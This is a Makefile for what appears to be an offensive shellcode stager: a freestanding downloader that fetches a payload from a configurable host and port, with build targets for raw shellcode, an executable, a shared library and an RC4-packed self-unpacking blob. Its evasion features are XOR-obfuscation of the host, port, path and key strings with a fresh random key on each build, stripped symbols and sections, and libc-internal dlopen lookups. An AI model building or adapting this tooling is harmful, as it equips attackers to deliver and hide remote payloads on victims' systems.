CC = gcc
COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. \
								-fno-toplevel-reorder -s -fno-ident -ffunction-sections -fdata-sections \
								-fno-asynchronous-unwind-tables -fvisibility=hidden -ffixed-r15

# Debug support
ifdef DEBUG
	COMMON_CFLAGS += -DDEBUG
endif

# Common linker flags
LDFLAGS_COMMON = -static -Wl,--gc-sections -Wl,-N -Wl,--build-id=none

# Specific linker flags
STAGE0_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x10000000
STAGE1_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x0

# Default configuration (can be overridden by environment variables)
DOWNLOAD_HOST ?= 127.0.0.1
DOWNLOAD_PORT ?= 8080
DOWNLOAD_PATH ?= /payload
DOWNLOAD_KEY ?= secret
MODULE_PATH ?= 
# Generate random XOR key per build
XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(128, 255)))")

# XOR-encode config strings
XOR_HOST := $(shell python3 -c "s='$(DOWNLOAD_HOST)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PORT := $(shell python3 -c "s='$(DOWNLOAD_PORT)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PATH := $(shell python3 -c "s='$(DOWNLOAD_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_MODULE_PATH := $(shell python3 -c "s='$(MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")

# Transport selection: which transport_*.c to compile.
# Built-in freestanding transports: http, tcp, udp (raw syscalls, no libc).
# Add your own transport_<name>.c and select it with TRANSPORT=<name>.
TRANSPORT ?= http
TRANSPORT_SRC = transport_$(TRANSPORT).c

# dynload symbol resolution strategy (see dynload.c). Both modes resolve only
# from libc.so.6.
#   public  = dlopen/dlsym/dlclose (glibc >= 2.34)
#   libc_dl = __libc_dlopen_mode/__libc_dlsym/__libc_dlclose (glibc < 2.34)
DYNLOAD_MODE ?= public
ifeq ($(DYNLOAD_MODE), libc_dl)
  DYNLOAD_MODE_CFLAG = -DDYNLOAD_MODE=1
else
  DYNLOAD_MODE_CFLAG = -DDYNLOAD_MODE=0
endif

# Dynamic symbol hash table preference (see dynload.c)
#   auto = DT_HASH then DT_GNU_HASH (default)
#   sysv = DT_HASH only
#   gnu  = DT_GNU_HASH only
HASH_STYLE ?= auto
ifeq ($(HASH_STYLE), sysv)
  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=1
else ifeq ($(HASH_STYLE), gnu)
  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=2
else
  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=0
endif

# Config options
COMMON_CFLAGS += $(DYNLOAD_MODE_CFLAG) $(HASH_STYLE_CFLAG)
COMMON_CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
COMMON_CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
COMMON_CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
COMMON_CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
COMMON_CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)

# Granular source selection: compile only what the selected transport needs.
#   http/tcp/udp -> raw syscall sockets (net_utils.c)
#   libcurl      -> runtime dynamic loader (dynload.c)
# New transports can extend these lists or add their own dependencies.
SOCKET_TRANSPORTS := http tcp udp
DYNLOAD_TRANSPORTS := libcurl

STAGE0_SRCS = downloader.c utils_min.c packer.c rc4.c debug.c syscalls.c
ifneq ($(filter $(TRANSPORT),$(SOCKET_TRANSPORTS)),)
  STAGE0_SRCS += net_utils.c
endif
ifneq ($(filter $(TRANSPORT),$(DYNLOAD_TRANSPORTS)),)
  STAGE0_SRCS += dynload.c
endif
STAGE0_SRCS += $(TRANSPORT_SRC)

STAGE0_TARGET = stager
SHELLCODE = stager.bin
SHARED_LIB = stager.so

# Self-unpacking (pluggable, mirrors the transport interface). Each unpacker
# has a stub (unpack_stub_<name>.c) and a matching packer (pack_<name>.py).
UNPACKER ?= rc4
ifeq ($(UNPACKER),rc4)
  UNPACK_SRCS = unpack_stub_rc4.c rc4.c
else
  UNPACK_SRCS = unpack_stub_$(UNPACKER).c
endif
PACK_SCRIPT = pack_$(UNPACKER).py

STUB_ELF = unpack_stub.elf
STUB_BIN = unpack_stub.bin
PACKED = stager-packed.bin

.PHONY: all raw executable executable-target so packed clean

# Default target generates raw shellcode (.bin)
all: raw

# 1. Raw shellcode (.bin)
raw: $(SHELLCODE)

$(SHELLCODE): $(STAGE0_TARGET)
	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(STAGE0_TARGET)
	objcopy -O binary -j .init -j .text -j .rodata -j .data $(STAGE0_TARGET) $@
	@echo "Shellcode generated at $(PWD)/$@"
	@wc -c $@

# 2. ELF Executable (stager)
executable: $(STAGE0_TARGET)

$(STAGE0_TARGET): $(STAGE0_SRCS)
	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
	@echo "[+] Exported symbols in $(STAGE0_TARGET):"
	@nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true

# 3. Shared Library (.so)
so: $(SHARED_LIB)

$(SHARED_LIB): $(STAGE0_SRCS)
	$(CC) $(COMMON_CFLAGS) -shared $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
	@echo "Shared library generated at $(PWD)/$@"
	@echo "[+] Exported symbols in $(SHARED_LIB):"
	@nm -D $@ 2>/dev/null | grep ' [T|g] ' || nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true

# 4. Packed self-unpacking shellcode
packed: $(PACKED)

$(STUB_ELF): $(UNPACK_SRCS) unpack_stub.ld
	$(CC) $(COMMON_CFLAGS) -static -Wl,--gc-sections -Wl,-N -Wl,--build-id=none -Wl,-e,_start -Wl,-T,unpack_stub.ld -o $@ $(UNPACK_SRCS)

# Extract the stub as a single flat binary, preserving the vaddr layout
# (including alignment padding between sections).  The old approach of
# extracting each section individually with -j and concatenating with cat
# silently dropped inter-section alignment gaps, which corrupted the .data
# header offset when .rodata was absent or differently-sized.
$(STUB_BIN): $(STUB_ELF)
	objcopy -O binary $(STUB_ELF) $@

$(PACKED): $(SHELLCODE) $(STUB_BIN) $(STUB_ELF)
	python3 $(PACK_SCRIPT) $(STUB_BIN) $(STUB_ELF) $(SHELLCODE) $(PACKED)
	@echo "Packed ($(UNPACKER)) shellcode generated at $(PWD)/$(PACKED)"
	@echo "unpacked: $$(wc -c < $(SHELLCODE)) bytes"
	@echo "packed:   $$(wc -c < $(PACKED)) bytes"

clean:
	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(SHARED_LIB) \
		$(STUB_ELF) $(STUB_BIN) $(PACKED) \
		downloader downloader.bin downloader_blob.h *.o
